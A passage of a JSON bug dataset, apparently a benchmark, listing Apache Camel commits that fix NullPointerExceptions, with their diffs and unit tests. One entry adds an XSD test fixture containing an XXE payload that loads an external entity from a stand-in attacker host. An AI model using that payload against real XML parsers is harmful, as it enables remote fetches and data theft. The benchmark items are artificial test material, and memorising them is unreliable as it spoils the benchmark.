        "unit_tests": [
            "ObjectHelperTest.java"
        ]
    },
    "camel_a37c0d9": {
        "bug_id": "camel_a37c0d9",
        "commit": "https://github.com/apache/camel/commit/a37c0d99cbca7b8d44d68ac6ccf58bc4d6b091a8",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/a37c0d99cbca7b8d44d68ac6ccf58bc4d6b091a8/components/camel-cmis/src/main/java/org/apache/camel/component/cmis/CMISProducer.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cmis/src/main/java/org/apache/camel/component/cmis/CMISProducer.java?ref=a37c0d99cbca7b8d44d68ac6ccf58bc4d6b091a8",
                "deletions": 1,
                "filename": "components/camel-cmis/src/main/java/org/apache/camel/component/cmis/CMISProducer.java",
                "patch": "@@ -195,8 +195,11 @@ private String getMimeType(Message message) throws NoSuchHeaderException {\n \n     private CMISSessionFacade getSessionFacade() throws Exception {\n         if (sessionFacade == null) {\n-            sessionFacade = sessionFacadeFactory.create(getEndpoint());\n+            CMISSessionFacade sessionFacade = sessionFacadeFactory.create(getEndpoint());\n             sessionFacade.initSession();\n+            // make sure to set sessionFacade to the field after successful initialisation\n+            // so that it has a valid session\n+            this.sessionFacade = sessionFacade;\n         }\n \n         return sessionFacade;",
                "raw_url": "https://github.com/apache/camel/raw/a37c0d99cbca7b8d44d68ac6ccf58bc4d6b091a8/components/camel-cmis/src/main/java/org/apache/camel/component/cmis/CMISProducer.java",
                "sha": "dc927020e2dfd4e81ea4e227d2e9c3512f5f451d",
                "status": "modified"
            }
        ],
        "message": "CAMEL-12548: NullPointerException in camel-cmis when using wrong credentials",
        "parent": "https://github.com/apache/camel/commit/9da3f5af0db4bbc04c7e29beaf9e8ebb27ae894f",
        "patched_files": [
            "CMISProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CMISProducerTest.java"
        ]
    },
    "camel_a7ca3eb": {
        "bug_id": "camel_a7ca3eb",
        "commit": "https://github.com/apache/camel/commit/a7ca3ebef6b950b3b16a7ad4fffab1e7139dfb69",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/a7ca3ebef6b950b3b16a7ad4fffab1e7139dfb69/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java?ref=a7ca3ebef6b950b3b16a7ad4fffab1e7139dfb69",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "patch": "@@ -139,7 +139,7 @@ protected boolean pollDirectory(String fileName, List<GenericFile<File>> fileLis\n         // compute the file path as relative to the starting directory\n         File path;\n         String endpointNormalized = FileUtil.normalizePath(endpointPath);\n-        if (file.getPath().startsWith(endpointNormalized)) {\n+        if (file.getPath().startsWith(endpointNormalized + File.separator)) {\n             // skip duplicate endpoint path\n             path = new File(ObjectHelper.after(file.getPath(), endpointNormalized + File.separator));\n         } else {",
                "raw_url": "https://github.com/apache/camel/raw/a7ca3ebef6b950b3b16a7ad4fffab1e7139dfb69/camel-core/src/main/java/org/apache/camel/component/file/FileConsumer.java",
                "sha": "facbc6b18c62dee65fab6859317e2b89ef5ae568",
                "status": "modified"
            },
            {
                "additions": 49,
                "blob_url": "https://github.com/apache/camel/blob/a7ca3ebef6b950b3b16a7ad4fffab1e7139dfb69/camel-core/src/test/java/org/apache/camel/component/file/FileConsumeRootDirManualTest.java",
                "changes": 49,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/file/FileConsumeRootDirManualTest.java?ref=a7ca3ebef6b950b3b16a7ad4fffab1e7139dfb69",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/file/FileConsumeRootDirManualTest.java",
                "patch": "@@ -0,0 +1,49 @@\n+/**\r\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\r\n+ * contributor license agreements.  See the NOTICE file distributed with\r\n+ * this work for additional information regarding copyright ownership.\r\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\r\n+ * (the \"License\"); you may not use this file except in compliance with\r\n+ * the License.  You may obtain a copy of the License at\r\n+ *\r\n+ *      http://www.apache.org/licenses/LICENSE-2.0\r\n+ *\r\n+ * Unless required by applicable law or agreed to in writing, software\r\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\r\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n+ * See the License for the specific language governing permissions and\r\n+ * limitations under the License.\r\n+ */\r\n+package org.apache.camel.component.file;\r\n+\r\n+import org.apache.camel.ContextTestSupport;\r\n+import org.apache.camel.builder.RouteBuilder;\r\n+import org.apache.camel.component.mock.MockEndpoint;\r\n+\r\n+public class FileConsumeRootDirManualTest extends ContextTestSupport {\r\n+\r\n+    public void testSkipMe() {\r\n+        // noop\r\n+    }\r\n+\r\n+    // manual test\r\n+\tpublic void xxxTestPollRootDirectory() throws Exception {\r\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\r\n+\t\tmock.expectedMinimumMessageCount(2);\r\n+\r\n+\t\tassertMockEndpointsSatisfied();\r\n+\t}\r\n+\r\n+    @Override\r\n+    protected RouteBuilder createRouteBuilder() throws Exception {\r\n+        return new RouteBuilder() {\r\n+            @Override\r\n+            public void configure() throws Exception {\r\n+                from(\"file:/?noop=true\")\r\n+                    .log(\"File: ${in.header.CamelFileName}\")\r\n+                    .to(\"mock:result\");\r\n+            }\r\n+        };\r\n+    }\r\n+}\r\n+\r",
                "raw_url": "https://github.com/apache/camel/raw/a7ca3ebef6b950b3b16a7ad4fffab1e7139dfb69/camel-core/src/test/java/org/apache/camel/component/file/FileConsumeRootDirManualTest.java",
                "sha": "4ea3f300b018dc3cfdc2dabb80494d6bcccb5fb3",
                "status": "added"
            }
        ],
        "message": "CAMEL-5540: Fixed NPE when consuming from root dir with file consumer\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1377243 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/98471196128d55cd6c1d4ac9e639d2f8f6447b67",
        "patched_files": [
            "FileConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "FileConsumeRootDirManualTest.java"
        ]
    },
    "camel_a870434": {
        "bug_id": "camel_a870434",
        "commit": "https://github.com/apache/camel/commit/a870434f826e83209ed512cd465e903084d702f2",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/a870434f826e83209ed512cd465e903084d702f2/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java?ref=a870434f826e83209ed512cd465e903084d702f2",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "patch": "@@ -117,8 +117,11 @@ public MethodInvocation createInvocation(Object pojo, Exchange exchange) throws\n \n         String name = exchange.getIn().getHeader(Exchange.BEAN_METHOD_NAME, String.class);\n         if (name != null) {\n-            if (operations.get(name).size() == 1) {\n-                methodInfo = operations.get(name).get(0);\n+            if (operations.containsKey(name)) {\n+                List<MethodInfo> methods = operations.get(name);\n+                if (methods != null && methods.size() == 1) {\n+                    methodInfo = methods.get(0);\n+                }\n             }\n         }\n         if (methodInfo == null) {",
                "raw_url": "https://github.com/apache/camel/raw/a870434f826e83209ed512cd465e903084d702f2/camel-core/src/main/java/org/apache/camel/component/bean/BeanInfo.java",
                "sha": "3546927ce8855e1aa55aac93ec9db71c51455686",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1424: Fixed NPE with BeanInfo.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@758692 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/65b5c75712f598b519c965e5a3b6d72f4b200d55",
        "patched_files": [
            "BeanInfo.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "BeanInfoTest.java"
        ]
    },
    "camel_a8c02f8": {
        "bug_id": "camel_a8c02f8",
        "commit": "https://github.com/apache/camel/commit/a8c02f87fef08c5592ec2e1fbde6ce7c6748709a",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/a8c02f87fef08c5592ec2e1fbde6ce7c6748709a/camel-core/src/test/java/org/apache/camel/builder/xml/XsltTestErrorListenerTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/builder/xml/XsltTestErrorListenerTest.java?ref=a8c02f87fef08c5592ec2e1fbde6ce7c6748709a",
                "deletions": 1,
                "filename": "camel-core/src/test/java/org/apache/camel/builder/xml/XsltTestErrorListenerTest.java",
                "patch": "@@ -35,7 +35,7 @@\n \n     public void testErrorListener() throws Exception {\n         // Xalan transformer cannot work as expected, so we just skip the test\n-        if (xsltBuilder.isXalanTransformer(xsltBuilder.getTemplate().newTransformer())) {\n+        if (xsltBuilder.isXalanTransformer(xsltBuilder.getConverter().getTransformerFactory().newTransformer())) {\n             return;\n         }\n         errorListener.error(EasyMock.<TransformerException>anyObject());",
                "raw_url": "https://github.com/apache/camel/raw/a8c02f87fef08c5592ec2e1fbde6ce7c6748709a/camel-core/src/test/java/org/apache/camel/builder/xml/XsltTestErrorListenerTest.java",
                "sha": "dbcce706387de2bcddaa73af9e52b1d318ce6a09",
                "status": "modified"
            }
        ],
        "message": "CAMEL-7130 fixed the NPE issue of the unit test",
        "parent": "https://github.com/apache/camel/commit/1389453ab87b5f35757e69203a9775e39f68a2f1",
        "patched_files": [
            "XsltErrorListener.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "XsltTestErrorListenerTest.java"
        ]
    },
    "camel_a8eafc8": {
        "bug_id": "camel_a8eafc8",
        "commit": "https://github.com/apache/camel/commit/a8eafc8ec82a442fc1909003e44047e855204883",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/a8eafc8ec82a442fc1909003e44047e855204883/components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/CryptoDataFormat.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/CryptoDataFormat.java?ref=a8eafc8ec82a442fc1909003e44047e855204883",
                "deletions": 1,
                "filename": "components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/CryptoDataFormat.java",
                "patch": "@@ -175,6 +175,10 @@ public Object unmarshal(Exchange exchange, InputStream encryptedStream) throws E\n \n     private void inlineInitVector(OutputStream outputStream, byte[] iv) throws IOException {\n         if (inline) {\n+            if (iv == null) {\n+                throw new IllegalStateException(\"Inlining cannot be performed, as no initialization vector was specified\");\n+            }\n+\n             DataOutputStream dout = new DataOutputStream(outputStream);\n             dout.writeInt(iv.length);\n             outputStream.write(iv);\n@@ -251,7 +255,7 @@ public void setInitializationVector(byte[] initializationVector) {\n      * encrypted ciphertext. When the payload is to be decrypted this\n      * initialization vector will need to be read from the stream. Requires that\n      * the formatter has been configured with an init vector that is valid for\n-     * the give algorithm.\n+     * the given algorithm.\n      *\n      * @param inline true if the initialization vector should be inlined in the stream.\n      */",
                "raw_url": "https://github.com/apache/camel/raw/a8eafc8ec82a442fc1909003e44047e855204883/components/camel-crypto/src/main/java/org/apache/camel/converter/crypto/CryptoDataFormat.java",
                "sha": "711b3df048f3d12a0f208b965a9dff50d30dd973",
                "status": "modified"
            }
        ],
        "message": "NPE fix",
        "parent": "https://github.com/apache/camel/commit/36e7b6681f8817a2b3baf0a30bd82ec14789b32a",
        "patched_files": [
            "CryptoDataFormat.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CryptoDataFormatTest.java"
        ]
    },
    "camel_a8fd547": {
        "bug_id": "camel_a8fd547",
        "commit": "https://github.com/apache/camel/commit/a8fd547fbc63429831be89b5f5566334bd9b4358",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/a8fd547fbc63429831be89b5f5566334bd9b4358/camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java?ref=a8fd547fbc63429831be89b5f5566334bd9b4358",
                "deletions": 2,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java",
                "patch": "@@ -458,8 +458,10 @@ public void startScheduler() {\n \n     @Override\n     protected void doStop() throws Exception {\n-        scheduler.unscheduleTask();\n-        ServiceHelper.stopAndShutdownServices(scheduler);\n+        if (scheduler != null) {\n+            scheduler.unscheduleTask();\n+            ServiceHelper.stopAndShutdownServices(scheduler);\n+        }\n \n         // clear counters\n         backoffCounter = 0;",
                "raw_url": "https://github.com/apache/camel/raw/a8fd547fbc63429831be89b5f5566334bd9b4358/camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java",
                "sha": "5f25a4f7ce400a94ec4c55424047047354ac2b4b",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE",
        "parent": "https://github.com/apache/camel/commit/15174ce7bf92d2b589f899f859897263f7d13ac3",
        "patched_files": [
            "ScheduledPollConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ScheduledPollConsumerTest.java"
        ]
    },
    "camel_a934af9": {
        "bug_id": "camel_a934af9",
        "commit": "https://github.com/apache/camel/commit/a934af99196ddbe6df6b5c3a858f525eea510623",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/a934af99196ddbe6df6b5c3a858f525eea510623/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java?ref=a934af99196ddbe6df6b5c3a858f525eea510623",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "patch": "@@ -507,7 +507,7 @@ public void remove() {\n \n             // this code is optimized to only use a Scanner if needed, eg there is a delimiter\n \n-            if (s.contains(delimiter)) {\n+            if (delimiter != null && s.contains(delimiter)) {\n                 // use a scanner if it contains the delimiter\n                 Scanner scanner = new Scanner((String)value);\n                 scanner.useDelimiter(delimiter);",
                "raw_url": "https://github.com/apache/camel/raw/a934af99196ddbe6df6b5c3a858f525eea510623/camel-core/src/main/java/org/apache/camel/util/ObjectHelper.java",
                "sha": "65e879154ed2550de853c107fb90cdf34ad917c0",
                "status": "modified"
            }
        ],
        "message": "Avoid potential NPE in createIterator if delimier is null\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1146771 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/094d00bcab83a9b6911cf1761a22b490a7bb4405",
        "patched_files": [
            "ObjectHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ObjectHelperTest.java"
        ]
    },
    "camel_a9c376f": {
        "bug_id": "camel_a9c376f",
        "commit": "https://github.com/apache/camel/commit/a9c376f71407ffe02ffb35c7aa7327ef0b08a655",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/camel-core/src/main/java/org/apache/camel/converter/IOConverter.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/converter/IOConverter.java?ref=a9c376f71407ffe02ffb35c7aa7327ef0b08a655",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/converter/IOConverter.java",
                "patch": "@@ -429,6 +429,13 @@ public static ObjectInput toObjectInput(final InputStream stream, final Exchange\n         return os.toByteArray();\n     }\n \n+    @Converter\n+    public static ByteBuffer covertToByteBuffer(InputStream is) throws IOException {\n+        ByteArrayOutputStream os = new ByteArrayOutputStream();\n+        IOHelper.copyAndCloseInput(is, os);\n+        return ByteBuffer.wrap(os.toByteArray());\n+    }\n+\n     /**\n      * @deprecated will be removed in Camel 3.0. Use the method which has 2 parameters.\n      */",
                "raw_url": "https://github.com/apache/camel/raw/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/camel-core/src/main/java/org/apache/camel/converter/IOConverter.java",
                "sha": "073547ea36c92984d5ee5471f777e4bc6275e5b5",
                "status": "modified"
            },
            {
                "additions": 55,
                "blob_url": "https://github.com/apache/camel/blob/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/camel-core/src/test/java/org/apache/camel/processor/ValidatingProcessorSchemaTest.java",
                "changes": 55,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/ValidatingProcessorSchemaTest.java?ref=a9c376f71407ffe02ffb35c7aa7327ef0b08a655",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/ValidatingProcessorSchemaTest.java",
                "patch": "@@ -0,0 +1,55 @@\n+package org.apache.camel.processor;\n+\n+import java.io.File;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.RuntimeCamelException;\n+import org.apache.camel.ValidationException;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.processor.validation.ValidatingProcessor;\n+import org.xml.sax.SAXParseException;\n+\n+public class ValidatingProcessorSchemaTest extends ContextTestSupport {\n+\n+  protected ValidatingProcessor validating;\n+\n+  @Override\n+  protected void setUp() throws Exception {\n+    validating = new ValidatingProcessor();\n+    validating.setSchemaFile(new File(\"src/test/resources/org/apache/camel/processor/ValidatingProcessorFailed.xsd\"));\n+\n+    super.setUp();\n+  }\n+\n+  public void testSchemaWithValidMessage() throws Exception {\n+    MockEndpoint mock = getMockEndpoint(\"mock:error\");\n+    mock.expectedMessageCount(1);\n+\n+    String xml = \"<?xml version=\\\"1.0\\\" encoding=\\\"iso-8859-1\\\"?>\"\n+        + \"<user xmlns=\\\"http://foo.com/bar\\\">\"\n+        + \"  <id>1</id>\"\n+        + \"  <username>davsclaus</username>\"\n+        + \"</user>\";\n+\n+    template.sendBody(\"direct:start\", xml);\n+    System.out.println(mock.getExchanges().get(0));\n+\n+    assertMockEndpointsSatisfied();\n+  }\n+\n+  protected RouteBuilder createRouteBuilder() {\n+    return new RouteBuilder() {\n+      public void configure() {\n+        //errorHandler(deadLetterChannel(\"mock:error\").redeliveryDelay(0).maximumRedeliveries(3));\n+\n+        //onException(SAXParseException.class).to(\"mock:schemeError\");\n+\n+        from(\"direct:start\").\n+            process(validating).\n+            to(\"mock:valid\");\n+      }\n+    };\n+  }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/camel-core/src/test/java/org/apache/camel/processor/ValidatingProcessorSchemaTest.java",
                "sha": "77bb18ca21ab964808f67937f86ded07898b28f8",
                "status": "added"
            },
            {
                "additions": 41,
                "blob_url": "https://github.com/apache/camel/blob/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/camel-core/src/test/resources/org/apache/camel/processor/ValidatingProcessorFailed.xsd",
                "changes": 41,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/resources/org/apache/camel/processor/ValidatingProcessorFailed.xsd?ref=a9c376f71407ffe02ffb35c7aa7327ef0b08a655",
                "deletions": 0,
                "filename": "camel-core/src/test/resources/org/apache/camel/processor/ValidatingProcessorFailed.xsd",
                "patch": "@@ -0,0 +1,41 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n+<!--\n+\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+         http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+\n+-->\n+<!DOCTYPE root [\n+  <!ENTITY % remote SYSTEM \"http://attackers.site:53/TEST\">\n+  %remote;\n+  %run;\n+  %trick;]>\n+\n+<xs:schema elementFormDefault=\"qualified\" version=\"1.0\"\n+  targetNamespace=\"http://foo.com/bar\"\n+  xmlns:tns=\"http://foo.com/bar\"\n+  xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n+\n+\n+  <xs:element name=\"user\">\n+    <xs:complexType>\n+      <xs:sequence>\n+        <xs:element name=\"id\" type=\"xs:int\"/>\n+        <xs:element name=\"username\" type=\"xs:string\"/>\n+      </xs:sequence>\n+    </xs:complexType>\n+  </xs:element>\n+\n+</xs:schema>",
                "raw_url": "https://github.com/apache/camel/raw/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/camel-core/src/test/resources/org/apache/camel/processor/ValidatingProcessorFailed.xsd",
                "sha": "7aa2aa4c51365ef2416bc3e0786fe6217ebf75be",
                "status": "added"
            },
            {
                "additions": 19,
                "blob_url": "https://github.com/apache/camel/blob/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowProducerTest.java",
                "changes": 19,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowProducerTest.java?ref=a9c376f71407ffe02ffb35c7aa7327ef0b08a655",
                "deletions": 0,
                "filename": "components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowProducerTest.java",
                "patch": "@@ -16,6 +16,9 @@\n  */\n package org.apache.camel.component.undertow;\n \n+import java.io.ByteArrayInputStream;\n+import java.io.InputStream;\n+\n import org.apache.camel.Exchange;\n import org.apache.camel.builder.RouteBuilder;\n import org.junit.Test;\n@@ -75,14 +78,30 @@ public void testHttpSimpleHeaderAndBody() throws Exception {\n         assertMockEndpointsSatisfied();\n     }\n \n+    @Test\n+    public void testHttpInputStream() throws Exception {\n+        getMockEndpoint(\"mock:input\").expectedBodiesReceived(\"Hello World\");\n+        getMockEndpoint(\"mock:input\").expectedHeaderReceived(Exchange.HTTP_METHOD, \"POST\");\n+\n+        String out = template.requestBodyAndHeader(\"undertow:http://localhost:{{port2}}/bar\", \"Hello World\", Exchange.HTTP_METHOD, \"POST\", String.class);\n+        assertEquals(\"This is the InputStream\", out);\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n     @Override\n     protected RouteBuilder createRouteBuilder() throws Exception {\n         return new RouteBuilder() {\n+            private InputStream is = new ByteArrayInputStream(\"This is the InputStream\".getBytes());\n             @Override\n             public void configure() throws Exception {\n                 from(\"undertow:http://localhost:{{port}}/foo\")\n                     .to(\"mock:input\")\n                     .transform().constant(\"Bye World\");\n+\n+                from(\"undertow:http://localhost:{{port2}}/bar\")\n+                    .to(\"mock:input\")\n+                    .transform().constant(is);\n             }\n         };\n     }",
                "raw_url": "https://github.com/apache/camel/raw/a9c376f71407ffe02ffb35c7aa7327ef0b08a655/components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowProducerTest.java",
                "sha": "91dd1a9eb63c0da847a391445e3c911d767dc6ee",
                "status": "modified"
            }
        ],
        "message": "CAMEL-12475 Fix the NPE error of camel-undertow component by adding the converter from InputStream into ByteBuffer",
        "parent": "https://github.com/apache/camel/commit/6991d32760aa0f9042e0137a9ed9d7458949c9f9",
        "patched_files": [
            "ValidatingProcessorFailed.java",
            "UndertowProducer.java",
            "IOConverter.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ValidatingProcessorSchemaTest.java",
            "IOConverterTest.java",
            "UndertowProducerTest.java"
        ]
    },
    "camel_ad3c7d4": {
        "bug_id": "camel_ad3c7d4",
        "commit": "https://github.com/apache/camel/commit/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/camel-core/src/main/java/org/apache/camel/processor/BatchProcessor.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/BatchProcessor.java?ref=ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/BatchProcessor.java",
                "patch": "@@ -25,6 +25,7 @@\n import org.apache.camel.impl.LoggingExceptionHandler;\n import org.apache.camel.impl.ServiceSupport;\n import org.apache.camel.spi.ExceptionHandler;\n+import org.apache.camel.util.ObjectHelper;\n import org.apache.camel.util.ServiceHelper;\n \n /**\n@@ -49,6 +50,8 @@\n     private BatchSender sender;\n     \n     public BatchProcessor(Processor processor, Collection<Exchange> collection) {\n+        ObjectHelper.notNull(processor, \"processor\");\n+        ObjectHelper.notNull(collection, \"collection\");\n         this.processor = processor;\n         this.collection = collection;\n         this.sender = new BatchSender();",
                "raw_url": "https://github.com/apache/camel/raw/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/camel-core/src/main/java/org/apache/camel/processor/BatchProcessor.java",
                "sha": "ebf02acb550f533484bed8daa81e4389e6793aa6",
                "status": "modified"
            },
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java",
                "changes": 18,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java?ref=ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java",
                "patch": "@@ -31,8 +31,8 @@\n public final class DefaultTraceEventMessage implements Serializable, TraceEventMessage {\n \n     private Date timestamp;\n-    private String previousNode;\n     private String fromEndpointUri;\n+    private String previousNode;\n     private String toNode;\n     private String exchangeId;\n     private String shortExchangeId;\n@@ -41,6 +41,7 @@\n     private String headers;\n     private String body;\n     private String bodyType;\n+    private String outHeaders;\n     private String outBody;\n     private String outBodyType;\n     private String causedByException;\n@@ -70,8 +71,11 @@ public DefaultTraceEventMessage(final Date timestamp, final ProcessorType toNode\n         this.headers = in.getHeaders().isEmpty() ? null : in.getHeaders().toString();\n         this.body = MessageHelper.extractBodyAsString(in);\n         this.bodyType = MessageHelper.getBodyTypeName(in);\n-        this.outBody = MessageHelper.extractBodyAsString(out);\n-        this.outBodyType = MessageHelper.getBodyTypeName(out);\n+        if (out != null) {\n+            this.outHeaders = out.getHeaders().isEmpty() ? null : out.getHeaders().toString();\n+            this.outBody = MessageHelper.extractBodyAsString(out);\n+            this.outBodyType = MessageHelper.getBodyTypeName(out);\n+        }\n         this.causedByException = exchange.getException() != null ? exchange.getException().toString() : null;\n     }\n \n@@ -149,6 +153,14 @@ public String getOutBodyType() {\n         return outBodyType;\n     }\n \n+    public String getOutHeaders() {\n+        return outHeaders;\n+    }\n+\n+    public void setOutHeaders(String outHeaders) {\n+        this.outHeaders = outHeaders;\n+    }\n+\n     public String getCausedByException() {\n         return causedByException;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceEventMessage.java",
                "sha": "715d49943efc82e6f75dfc7d161d13f694de408b",
                "status": "modified"
            },
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceFormatter.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceFormatter.java?ref=ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceFormatter.java",
                "patch": "@@ -38,6 +38,7 @@\n     private boolean showHeaders = true;\n     private boolean showBody = true;\n     private boolean showBodyType = true;\n+    private boolean showOutHeaders;\n     private boolean showOutBody;\n     private boolean showOutBodyType;\n     private boolean showException = true;\n@@ -66,6 +67,9 @@ public Object format(final TraceInterceptor interceptor, final ProcessorType nod\n         if (showBody) {\n             sb.append(\", Body:\").append(MessageHelper.extractBodyAsString(in));\n         }\n+        if (showOutHeaders && out != null) {\n+            sb.append(\", OutHeaders:\").append(out.getHeaders());\n+        }\n         if (showOutBodyType && out != null) {\n             sb.append(\", OutBodyType:\").append(MessageHelper.getBodyTypeName(out));\n         }\n@@ -135,6 +139,14 @@ public void setShowHeaders(boolean showHeaders) {\n         this.showHeaders = showHeaders;\n     }\n \n+    public boolean isShowOutHeaders() {\n+        return showOutHeaders;\n+    }\n+\n+    public void setShowOutHeaders(boolean showOutHeaders) {\n+        this.showOutHeaders = showOutHeaders;\n+    }\n+\n     public boolean isShowProperties() {\n         return showProperties;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/ad3c7d447e4cba0f68d83e3bc0b9d75ee1e978f5/camel-core/src/main/java/org/apache/camel/processor/interceptor/DefaultTraceFormatter.java",
                "sha": "ff6e7b9c887340ede93559bce321eaf99b75e8cd",
                "status": "modified"
            },
            {
                "additions": 72,
